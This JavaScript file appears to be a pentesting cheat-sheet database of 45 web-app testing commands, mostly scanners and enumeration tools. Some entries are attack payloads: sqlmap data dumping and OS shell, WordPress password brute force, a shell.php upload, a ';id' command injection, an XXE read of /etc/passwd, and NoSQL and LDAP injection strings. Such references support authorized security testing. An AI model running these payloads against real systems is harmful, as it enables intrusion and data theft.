// Web Application Testing Commands Database
const WEB_COMMANDS = {
    "Directory & File Discovery": [
        {
            "id": 1,
            "name": "Gobuster Directory Scan",
            "command": "gobuster dir -u http://{ip} -w /usr/share/wordlists/dirb/common.txt",
            "description": "Directory brute force using Gobuster",
            "category": "Discovery"
        },
        {
            "id": 2,
            "name": "Dirbuster Scan",
            "command": "dirb http://{ip} /usr/share/wordlists/dirb/common.txt",
            "description": "Directory enumeration with Dirb",
            "category": "Discovery"
        },
        {
            "id": 3,
            "name": "FFuF Directory Scan",
            "command": "ffuf -w /usr/share/wordlists/dirb/common.txt -u http://{ip}/FUZZ",
            "description": "Fast web fuzzer for directory discovery",
            "category": "Discovery"
        },
        {
            "id": 4,
            "name": "Wfuzz Directory Scan",
            "command": "wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://{ip}/FUZZ",
            "description": "Web application fuzzing with Wfuzz",
            "category": "Discovery"
        },
        {
            "id": 5,
            "name": "Feroxbuster Recursive",
            "command": "feroxbuster -u http://{ip} -w /usr/share/wordlists/dirb/common.txt",
            "description": "Recursive directory brute force",
            "category": "Discovery"
        },
        {
            "id": 6,
            "name": "Nikto Web Scanner",
            "command": "nikto -h http://{ip}",
            "description": "Web vulnerability scanner",
            "category": "Vulnerability Assessment"
        },
        {
            "id": 7,
            "name": "Whatweb Technology Detection",
            "command": "whatweb http://{ip}",
            "description": "Identify web technologies",
            "category": "Enumeration"
        }
    ],
    "SQL Injection Testing": [
        {
            "id": 8,
            "name": "SQLMap Basic Test",
            "command": "sqlmap -u 'http://{ip}/page.php?id=1' --dbs",
            "description": "Basic SQL injection test with database enumeration",
            "category": "SQL Injection"
        },
        {
            "id": 9,
            "name": "SQLMap Cookie Injection",
            "command": "sqlmap -u 'http://{ip}/page.php' --cookie='id=1' --dbs",
            "description": "Test SQL injection in cookies",
            "category": "SQL Injection"
        },
        {
            "id": 10,
            "name": "SQLMap POST Data",
            "command": "sqlmap -u 'http://{ip}/login.php' --data='username=admin&password=admin' --dbs",
            "description": "Test SQL injection in POST parameters",
            "category": "SQL Injection"
        },
        {
            "id": 11,
            "name": "SQLMap with Proxy",
            "command": "sqlmap -u 'http://{ip}/page.php?id=1' --proxy='http://127.0.0.1:8080' --dbs",
            "description": "SQLMap through Burp Suite proxy",
            "category": "SQL Injection"
        },
        {
            "id": 12,
            "name": "SQLMap Dump Tables",
            "command": "sqlmap -u 'http://{ip}/page.php?id=1' -D database_name --tables",
            "description": "Enumerate tables in specific database",
            "category": "SQL Injection"
        },
        {
            "id": 13,
            "name": "SQLMap Dump Data",
            "command": "sqlmap -u 'http://{ip}/page.php?id=1' -D database_name -T table_name --dump",
            "description": "Dump data from specific table",
            "category": "SQL Injection"
        },
        {
            "id": 14,
            "name": "SQLMap OS Shell",
            "command": "sqlmap -u 'http://{ip}/page.php?id=1' --os-shell",
            "description": "Attempt to get OS shell via SQL injection",
            "category": "SQL Injection"
        }
    ],
    "XSS & Client-Side": [
        {
            "id": 15,
            "name": "XSStrike XSS Scanner",
            "command": "xsstrike -u 'http://{ip}/search.php?q=test'",
            "description": "Advanced XSS detection and exploitation",
            "category": "XSS"
        },
        {
            "id": 16,
            "name": "OWASP ZAP Spider",
            "command": "zap-cli spider http://{ip}",
            "description": "Spider web application with OWASP ZAP",
            "category": "Discovery"
        },
        {
            "id": 17,
            "name": "OWASP ZAP Active Scan",
            "command": "zap-cli active-scan http://{ip}",
            "description": "Active vulnerability scan with ZAP",
            "category": "Vulnerability Assessment"
        },
        {
            "id": 18,
            "name": "Dalfox XSS Scanner",
            "command": "dalfox url http://{ip}/search.php?q=FUZZ",
            "description": "Fast XSS scanner and exploitation tool",
            "category": "XSS"
        }
    ],
    "WordPress Testing": [
        {
            "id": 19,
            "name": "WPScan Vulnerability Scan",
            "command": "wpscan --url http://{ip} --enumerate vp,vt,tt,cb,dbe",
            "description": "WordPress vulnerability scanner",
            "category": "CMS"
        },
        {
            "id": 20,
            "name": "WPScan User Enumeration",
            "command": "wpscan --url http://{ip} --enumerate u",
            "description": "Enumerate WordPress users",
            "category": "CMS"
        },
        {
            "id": 21,
            "name": "WPScan Plugin Scan",
            "command": "wpscan --url http://{ip} --enumerate p",
            "description": "Enumerate WordPress plugins",
            "category": "CMS"
        },
        {
            "id": 22,
            "name": "WPScan Brute Force",
            "command": "wpscan --url http://{ip} --usernames admin --passwords /usr/share/wordlists/rockyou.txt",
            "description": "Brute force WordPress login",
            "category": "CMS"
        }
    ],
    "API Testing": [
        {
            "id": 23,
            "name": "Arjun Parameter Discovery",
            "command": "arjun -u http://{ip}/api/endpoint",
            "description": "Discover hidden API parameters",
            "category": "API"
        },
        {
            "id": 24,
            "name": "Kiterunner API Discovery",
            "command": "kr scan http://{ip} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
            "description": "API endpoint discovery",
            "category": "API"
        },
        {
            "id": 25,
            "name": "Postman Collection Test",
            "command": "newman run collection.json -e environment.json",
            "description": "Run Postman collection tests",
            "category": "API"
        }
    ],
    "SSL/TLS Testing": [
        {
            "id": 26,
            "name": "SSLyze SSL Scanner",
            "command": "sslyze {ip}:443",
            "description": "Comprehensive SSL/TLS security scanner",
            "category": "SSL/TLS"
        },
        {
            "id": 27,
            "name": "TestSSL Analysis",
            "command": "testssl.sh https://{ip}",
            "description": "Test SSL/TLS encryption and vulnerabilities",
            "category": "SSL/TLS"
        },
        {
            "id": 28,
            "name": "SSLScan Certificate Check",
            "command": "sslscan {ip}:443",
            "description": "SSL certificate and cipher analysis",
            "category": "SSL/TLS"
        }
    ],
    "File Upload Testing": [
        {
            "id": 29,
            "name": "Upload Bypass Test",
            "command": "curl -X POST -F 'file=@shell.php' http://{ip}/upload.php",
            "description": "Test file upload functionality",
            "category": "File Upload"
        },
        {
            "id": 30,
            "name": "Fuxploider Upload Fuzzer",
            "command": "python3 fuxploider.py --url http://{ip}/upload --not-regex 'error'",
            "description": "Automated file upload vulnerability scanner",
            "category": "File Upload"
        }
    ],
    "CSRF & Session Testing": [
        {
            "id": 31,
            "name": "Burp CSRF PoC",
            "command": "# Generate CSRF PoC in Burp Suite",
            "description": "Generate Cross-Site Request Forgery proof of concept",
            "category": "CSRF"
        },
        {
            "id": 32,
            "name": "Session Token Analysis",
            "command": "burp-rest-api --scan-config session_analysis.json",
            "description": "Analyze session token randomness",
            "category": "Session Management"
        }
    ],
    "Command Injection": [
        {
            "id": 33,
            "name": "Commix Injection Test",
            "command": "commix -u 'http://{ip}/ping.php?ip=127.0.0.1'",
            "description": "Automated command injection testing",
            "category": "Command Injection"
        },
        {
            "id": 34,
            "name": "Manual Command Injection",
            "command": "curl 'http://{ip}/ping.php?ip=127.0.0.1;id'",
            "description": "Manual command injection test",
            "category": "Command Injection"
        }
    ],
    "LDAP Injection": [
        {
            "id": 35,
            "name": "LDAP Injection Test",
            "command": "curl 'http://{ip}/search.php?user=*)(&' ",
            "description": "Test for LDAP injection vulnerabilities",
            "category": "LDAP Injection"
        }
    ],
    "XXE Testing": [
        {
            "id": 36,
            "name": "XXE External Entity Test",
            "command": "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>' http://{ip}/xml_endpoint",
            "description": "Test for XML External Entity injection",
            "category": "XXE"
        }
    ],
    "NoSQL Injection": [
        {
            "id": 37,
            "name": "NoSQL Injection Test",
            "command": "curl -X POST -H 'Content-Type: application/json' -d '{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}' http://{ip}/login",
            "description": "Test for NoSQL injection vulnerabilities",
            "category": "NoSQL Injection"
        }
    ],
    "IDOR Testing": [
        {
            "id": 38,
            "name": "IDOR Parameter Test",
            "command": "# Use Burp Intruder to test sequential IDs",
            "description": "Test for Insecure Direct Object References",
            "category": "IDOR"
        }
    ],
    "Subdomain Enumeration": [
        {
            "id": 39,
            "name": "Subfinder Subdomain Discovery",
            "command": "subfinder -d {domain}",
            "description": "Passive subdomain enumeration",
            "category": "Subdomain Discovery"
        },
        {
            "id": 40,
            "name": "Amass Subdomain Enum",
            "command": "amass enum -d {domain}",
            "description": "In-depth subdomain enumeration",
            "category": "Subdomain Discovery"
        },
        {
            "id": 41,
            "name": "Knockpy Subdomain Scan",
            "command": "knockpy {domain}",
            "description": "Subdomain scanner with wordlist",
            "category": "Subdomain Discovery"
        },
        {
            "id": 42,
            "name": "Sublist3r Discovery",
            "command": "sublist3r -d {domain}",
            "description": "Fast subdomain enumeration tool",
            "category": "Subdomain Discovery"
        }
    ],
    "Content Discovery": [
        {
            "id": 43,
            "name": "Wayback URLs",
            "command": "waybackurls {domain}",
            "description": "Extract URLs from Wayback Machine",
            "category": "Content Discovery"
        },
        {
            "id": 44,
            "name": "GAU URL Discovery",
            "command": "gau {domain}",
            "description": "Get All URLs from multiple sources",
            "category": "Content Discovery"
        },
        {
            "id": 45,
            "name": "Hakrawler Web Crawler",
            "command": "echo {domain} | hakrawler",
            "description": "Fast web crawler for URLs and endpoints",
            "category": "Content Discovery"
        }
    ]
};